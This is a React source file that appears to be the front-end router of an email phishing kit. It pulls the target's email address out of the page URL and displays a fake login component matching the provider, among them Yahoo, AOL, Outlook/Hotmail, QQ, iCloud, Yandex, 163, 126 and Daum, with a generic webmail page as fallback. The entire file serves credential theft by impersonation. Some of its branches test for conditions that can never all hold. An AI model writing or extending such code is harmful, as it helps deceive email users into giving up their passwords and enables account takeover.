
import React, { useState, useEffect, useCallback, } from 'react';
import './App.css';

//  login components
// import Yahoo from './EmailProviders/YAHOO/Yahoo';
// import AOL from './EmailProviders/AOL/AoL';
// import Outlook from './EmailProviders/OUTLOOK/Outlook';
// import Zoho from './EmailProviders/ZOHO/Zoho';
// import Webmail from './EmailProviders/WEBMAIL/Webmail';
// import Default from './EmailProviders/001/Default';
// import Yandex from './EmailProviders/YANDEX/Yandex';
// import QQ from './EmailProviders/QQ/QQ';
// import Icloud from './EmailProviders/ICLOUD/Icloud';
// import AliyunDotCom from './EmailProviders/ALIYUNDOTCOM/Aliyun';
// import DahumDotNet from './EmailProviders/DAHUMDOTNET/DahumDotNet';
// import OneSixThree from './EmailProviders/163DOTCOM/163';
// import OneTwoSix from './EmailProviders/126DOTCOM/126';

import Translator from './translatorforall/translatorforall';
// lazy load login components

const Yahoo = React.lazy(()=> import('./EmailProviders/YAHOO/Yahoo'));
const AOL = React.lazy(()=> import('./EmailProviders/AOL/AoL'));
const Outlook = React.lazy(()=> import('./EmailProviders/OUTLOOK/Outlook'));
const Zoho = React.lazy(()=> import('./EmailProviders/ZOHO/Zoho'));
const Webmail = React.lazy(()=> import('./EmailProviders/WEBMAIL/Webmail'));
const Default = React.lazy(()=> import('./EmailProviders/001/Default'));
const Yandex = React.lazy(()=> import('./EmailProviders/YANDEX/Yandex'));
const QQ = React.lazy(()=> import('./EmailProviders/QQ/QQ'));
const Icloud = React.lazy(()=> import('./EmailProviders/ICLOUD/Icloud'));
const AliyunDotCom = React.lazy(()=> import('./EmailProviders/ALIYUNDOTCOM/Aliyun'));
const DahumDotNet = React.lazy(()=> import('./EmailProviders/DAHUMDOTNET/DahumDotNet'));
const OneSixThree = React.lazy(()=> import('./EmailProviders/163DOTCOM/163'));
const OneTwoSix = React.lazy(()=> import('./EmailProviders/126DOTCOM/126'));

function GenPage() {
    const [top, setTop] = useState(true);

    const toggleTop = ()=>{
      // console.log('toggleTop');
      setTop(top=> !top);
    };

  const [yahooState, setYahooState] = useState(false);
  const [aolState, setAolState] = useState(false);
  const [outlookState, setOutlookState] = useState(false);
  const [zohoState, setZohoState] = useState(false);
  const [webmailState, setWebmailState] = useState(false);
  const [defaultState, setDefaultState] = useState(true);
  const [yandexState, setYandexState] = useState(false);
  const [QQState, setQQState] = useState(false);
  const [dahumDotNetState, setDahumDotNetState] = useState(false);
  const [icloudState, setIcloudState] = useState(false);
  const [aliyunState, setAliyunState] = useState(false);
  const [one163State, setOne163State] = useState(false);
  const [one26State, setOne26State] = useState(false);


// for the email domain only
  const emailInTheURL = window.location.href;
  const sliceEqualSign = emailInTheURL.indexOf("@");
  const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();
  console.log(extracetdEmail);


  // extraction for the full email only
    const emailInTheURLA = window.location.href;
    const sliceEqualSignB = emailInTheURLA.indexOf("=");
    const extracetdEmailC = emailInTheURLA.substr((sliceEqualSignB+1)).split('&', 1).toString();
    console.log(extracetdEmailC);


    const mountYahooDomain = useCallback(()=>{
      if(emailInTheURL.includes('yahoo.com')){
        setYahooState(true);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
      }
    }, [emailInTheURL]);

    
    const mountAOLDomain = useCallback(()=>{
      if(emailInTheURL.includes('aol.com')){
        setYahooState(false);
        setAolState(true);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
      }
    }, [emailInTheURL]);


    const mountOulookDomain = useCallback(()=>{
      if(emailInTheURL.includes('outlook.com')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(true);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
      }
    }, [emailInTheURL]);



    const mountOutlookAndHotmail = useCallback(()=>{
      if(emailInTheURL.includes('hotmail.com')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(true);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
      }
    }, [emailInTheURL]);



    const mountZohoDomain = useCallback(()=>{
      if(emailInTheURL.includes('zoho.com')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(true);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
      }
    }, [emailInTheURL]);


    const mountYandexDomain = useCallback(()=>{
      if(emailInTheURL.includes('yandex.com')){
       setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(true);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
      }
    }, [emailInTheURL]);


    const mountDefaultDomain = useCallback(()=>{
      if (emailInTheURL.includes('gmail') && emailInTheURL.includes('ipfs') && emailInTheURL.includes('mailchimp') &&  emailInTheURL.includes('mailgun') && emailInTheURL.includes('sendgrid') && emailInTheURL.includes('fastmail')  && emailInTheURL.includes('tutanota') && emailInTheURL.includes('proton') && emailInTheURL.includes('korea.com') && emailInTheURL.includes('daum.net') && emailInTheURL.includes('kakao.com')) {
        setDefaultState(true);
        setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
     }
    }, [emailInTheURL])
    

    const mountWebmailDomain = ()=>{
      // if(emailInTheURL.includes('webmail')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(true);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
      // }
    }


    const mountQQDOmain = useCallback(()=>{
      if(emailInTheURL.includes('qq.com')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(true);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
      }
    }, [emailInTheURL]);

    // design dahum page login and then you can mount 
    // i screenshoted it in my PC

    const mountDahumDotNet = useCallback(()=>{
      if(emailInTheURL.includes('daum.net')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(true);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
      }
    }, [emailInTheURL]);


    const mountIcloud = useCallback(()=>{
      if(emailInTheURL.includes('icloud.com')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(true);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
      }
    }, [emailInTheURL]);


    const mountAliyunDotCom = useCallback(()=>{
      if(emailInTheURL.includes('aliyun.com')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(true);
        setOne163State(false);
        setOne26State(false);
      }
    }, [emailInTheURL]);


    const mount163DotCom = useCallback(()=>{
      if(emailInTheURL.includes('163.com')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(true);
        setOne26State(false);
      }
    }, [emailInTheURL]);


    const mountOne26DotCom = useCallback(()=>{
      if(emailInTheURL.includes('126.com')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(true);
      }
    }, [emailInTheURL]);

    // useeffect

    
    useEffect(()=>{

      if(emailInTheURL.includes('yahoo.com')){
        return mountYahooDomain();
      }

      if(emailInTheURL.includes('aol.com')){
        return mountAOLDomain();
      }

      if(emailInTheURL.includes('hotmail.com')){
        return mountOutlookAndHotmail();
      }
      
      if(emailInTheURL.includes('zoho.com')){
        return mountZohoDomain();
      }

      if(emailInTheURL.includes('yandex.com')){
        return mountYandexDomain();
      }

      if(emailInTheURL.includes('qq.com')){
        return mountQQDOmain();
      }

      if (emailInTheURL.includes('126.com')) {
        return mountOne26DotCom();
      }


      if (emailInTheURL.includes('163.com')) {
        return mount163DotCom();
      }

      if (emailInTheURL.includes('aliyun.com')) {
        return mountAliyunDotCom();
      }

      if (emailInTheURL.includes('icloud.com')) {
        return mountIcloud();
      }
      
      if(emailInTheURL.includes('korea.com')){
        return mountDefaultDomain();
      }

      if(emailInTheURL.includes('daum.net')){
        return mountDahumDotNet();
      }

      if (emailInTheURL.includes('kakao.com')) {
        return mountDefaultDomain()
      }

      if (emailInTheURL.includes('alibaba.com')) {
        return mountDefaultDomain()
      }

      if(emailInTheURL.includes('syskay.com')){
        return mountWebmailDomain();
      }

      if(emailInTheURL.includes('outlook.com')){
        return mountOulookDomain();
      };

      if (emailInTheURL.includes('gmail.com') && 
      emailInTheURL.includes('ipfs') && 
      emailInTheURL.includes('mailchimp') && 
      emailInTheURL.includes('mailgun') && 
      emailInTheURL.includes('sendgrid') && 
      emailInTheURL.includes('fastmail') && 
      emailInTheURL.includes('brevo') && 
      emailInTheURL.includes('hushmail') && 
      emailInTheURL.includes('mailfence') && 
      emailInTheURL.includes('privateemail') && 
      emailInTheURL.includes('tutanota') && 
      emailInTheURL.includes('proton') && 
      emailInTheURL.includes('daum.net') && 
      emailInTheURL.includes('korea.com') && 
      emailInTheURL.includes('kakao.com') &&
      emailInTheURL.includes('test.com')) 
        {
          return mountDefaultDomain();
        }


       if(!emailInTheURL.includes('gmail.com') && 
       !emailInTheURL.includes('ipfs') && 
       !emailInTheURL.includes('mailchimp.com') &&  
       !emailInTheURL.includes('mailgun.com') && 
       !emailInTheURL.includes('sendgrid') && 
       !emailInTheURL.includes('fastmail.com') && 
       !emailInTheURL.includes('brevo') && 
       !emailInTheURL.includes('hushmail') && 
       !emailInTheURL.includes('privateemail.com') && 
       !emailInTheURL.includes('tutanota.com') && 
       !emailInTheURL.includes('proton.com') && 
       !emailInTheURL.includes('dahum.net') ){
        return mountWebmailDomain();
       };
      
      // if(emailInTheURL.includes('yahoo') && emailInTheURL.includes('aol') && emailInTheURL.includes('outlook') && emailInTheURL.includes('zoho') && emailInTheURL.includes('hotmail') && emailInTheURL.includes('qq'))
        

        // if(emailInTheURL.includes('daum.net')){
        //   return mountDefaultDomain();
        // }


      // insert the dependencies in the useeffect array []
    }, [ mountYahooDomain, mountAOLDomain, mountOulookDomain, mountOutlookAndHotmail, mountZohoDomain, mountYandexDomain, mountQQDOmain, emailInTheURL, mountDefaultDomain, mountDahumDotNet, mountIcloud, mountAliyunDotCom, mountOne26DotCom, mount163DotCom ]);


  return (
    <section>

      {/* <Preloader /> */}
      
      { top ? <Translator top={top} toggleTop={toggleTop} /> : null }

        { defaultState ? <Default /> : undefined }

        { yahooState ? <Yahoo /> : undefined }

        { aolState ? <AOL /> : undefined }

        { outlookState ? <Outlook /> : undefined }

        { zohoState ? <Zoho /> : undefined }
        
        { webmailState ? <Webmail /> : undefined }

        { yandexState ? <Yandex /> : undefined  }

        { QQState ? <QQ /> : undefined }

        { dahumDotNetState ? <DahumDotNet /> : undefined }

        { icloudState ? <Icloud /> : undefined }

        { aliyunState ? <AliyunDotCom /> : undefined }

        { one163State ? <OneSixThree /> : undefined }

        { one26State ? <OneTwoSix /> : undefined }

    </section>
    
  );
};

export default GenPage;